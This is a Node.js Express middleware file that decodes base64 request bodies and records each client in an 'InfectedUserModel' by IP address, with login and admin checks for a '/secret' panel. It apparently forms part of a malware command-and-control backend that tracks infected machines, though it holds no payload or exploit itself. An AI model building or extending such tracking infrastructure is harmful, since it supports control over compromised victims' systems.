
let fs = require('fs');

let BaseController = require('./BaseController');
let Constants = require('../util/constant');
let helper = require('../util/helper');
let InfectedUserModel = require('../models/InfectedUserModel');

module.exports = {
    name: 'MiddlewareController',

    // Parse request body
    parseBody: async function (req, res, next) {
        try {
            // Get ip address of client
            const ip_data = req.headers['x-forwarded-for'] || req.connection.remoteAddress;
            const last_index = ip_data.lastIndexOf(':');
            const ip_address = ip_data.substring(last_index + 1);

            if (req.originalUrl.endsWith('upload_file')) {     // in case of route 'upload_file', skip to next middleware
                next();
                return;
            }

            // Should decode body first
            req.body = helper.base642Json(JSON.stringify(req.body));
            req.body.st = Constants.RES_SUCCESS;

            // Check client id exists in the InfectedUser table
            let user_record = await InfectedUserModel.findOne({ id: req.body.id });
            if (!user_record) {             // Create new
                user_record = new InfectedUserModel({
                    username: `user_${ip_address}`,
                    ip_address: ip_address
                });
                await user_record.save();
            } else {                        // Update ip address if different
                await user_record.updateOne({ ip_address });
            }
            req.body.id = user_record.id;
            req.body.username = user_record.username;
        } catch (e) {
            req.body.st = Constants.RES_FAILED;
            console.log(e);
        }
        next();
    },

    m_checkLogin: function (req, res, next) {
        if (req.session.login === 1 && req.session.user) next();
        else {
            req.session.login = 0;
            req.session.user = null;
            res.redirect('/secret/login');
        }
    },
    m_checkLoginPost: function (req, res, next) {
        if (req.session.login === 1 && req.session.user) next();
        else {
            req.session.login = 0;
            req.session.user = null;
            res.send({status: 'error', message: res.cookie().__('You are not logged in')});
        }
    },
    m_checkAdmin: function (req, res, next) {
        let role = req.session.user.role;
        if (role === 0 || role === 1) next();
        else res.redirect('/404');
    },
    m_checkAdminPost: function (req, res, next) {
        let role = req.session.user.role;
        if (role === 0 || role === 1) next();
        else res.send({status: 'error', message: res.cookie().__('Access is undefined')});
    },

    checkFolders: function (req, res, next) {
        let temp_dir = 'public/temp';
        if (!fs.existsSync(temp_dir)) {
            fs.mkdirSync(temp_dir);
        }
        let upload_dir = 'public/uploads';
        if (!fs.existsSync(upload_dir)) {
            fs.mkdirSync(upload_dir);
        }

        next();
    },
};


